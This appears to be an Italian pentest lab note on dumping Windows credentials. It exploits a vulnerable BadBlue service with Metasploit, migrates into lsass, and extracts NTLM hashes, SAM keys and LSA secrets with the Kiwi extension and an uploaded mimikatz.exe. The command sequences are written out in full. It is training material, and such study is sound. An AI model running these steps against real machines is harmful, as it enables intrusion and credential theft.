# Dumping Hashes With Mimikatz

<figure><img src="../../.gitbook/assets/image (21) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Kiwi ha come vantaggio che viene eseguito in memoria quindi non lascia artefatti o tracce sul target come mimikatz che dev'essere scaricato.

## Come dumpare NTLM hashes

### Primo step: exploitare un servizio vulnerabile sul target

```
nmap -sV 10.2.18.199
service postresql start && msfconsole
search badblue
use exploit/windows/(http/badblue_passthru
set RHOSTS 10.2.18.199
exploit
sysinfo
getuid
pgrep lsass
migrate 788
getuid
```

<figure><img src="../../.gitbook/assets/image (22) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

La macchina target ha sulla porta 80 un servizio vulnerabile chiamato BadBlue

Noi facciamo comunque uno scan con nmap dalla nostra macchina attaccante.

<figure><img src="../../.gitbook/assets/image (23) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

BadBlue in version 2.7

<figure><img src="../../.gitbook/assets/image (24) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (26) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (28) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

L'unica opzione da configurare è il target IP

<figure><img src="../../.gitbook/assets/image (29) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (30) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (31) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Migriamo a un processo 64 bit, ed essendo Administrator possiamo migrare anche a un processo SYSTEM.

### Kiwi module

Kiwi è una built-in meterpreter extension.

```
load kiwi
?
creds_all
lsa_dump_sam
lsa_dump_secrets
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

creads\_all per dumpare tutte le credenziali:

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Possiamo vedere gli hash NTLM, wdigest e kerberos sono vuote, questo perché le versioni successive a Windows 8.1 non conservano password in cleartext in nessun modo.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Il comando lsa\_dump\_sam ci mostra tutti gli hash NTLM che sono presenti e la SysKey, che può tornare utile più tardi. Abbiamo anche la SAMKey.

Il comando lsa\_dump\_secrets ci restituisce:

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In alcuni casi ci può fornire delle credenziali in cleartext, in questo caso no quindi fa niente.



<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se si lavora con un ambiente Active Directory è possibile usare i comandi kerberos\_ticket e golden\_ticket\_create.

> <p align="center">password_change è un po' troppo da fare in un pentest, perché significa cambiare password ad utenti in produzione. Quindi non bisogna farlo in casi reali di penetration test.</p>

### Mimikatz

Mimikatz è un eseguibile che bisogna avere sulla macchina target. Kali Linux lo mette già a disposizione nella cartella /usr/share/windows-resources/mimikatz/x64/mimikatz.exe.

Dalla meterpreter session:

```
pwd 
cd C:\\
mkdir Temp
cd Temp
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell
dir
.\mimikatz.exe
privilege::debug // se "20 OK" allora abbiamo i permessi per eseguire hash extraction from memory
lsadump_sam //ci restituisce SysKey, SAMKey, NTLM degli utenti, RID
lsadump::secrets
sekurlsa::logonpasswords // se presenti in memoria le password usate nei login
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Con il comando privilege::debug verifichiamo di avere i permessi per poter eseguire hash extraction from memory, se ci restituisce "20 OK" allora va bene.

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Possiamo anche dumpare i secrets:

<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



Con mimikatz possiamo mostrare le logon password usate se il sistema è stato configurato per tenerle in memoria.

<figure><img src="../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In questo caso il sistema è stato configurato bene perché non ci viene mostrata nessuna password in chiaro.

<figure><img src="../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Questi sono tutti logon effettuati (es. quello sopra è un interattivo da window manager) con loggate le password, che in questo caso sono (null) perché non vengono tenute in memoria, cleartext passwords sono state disabilitate.

<figure><img src="../../.gitbook/assets/image (20) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al massimo vengono mostrati gli hash NTLM come prima.
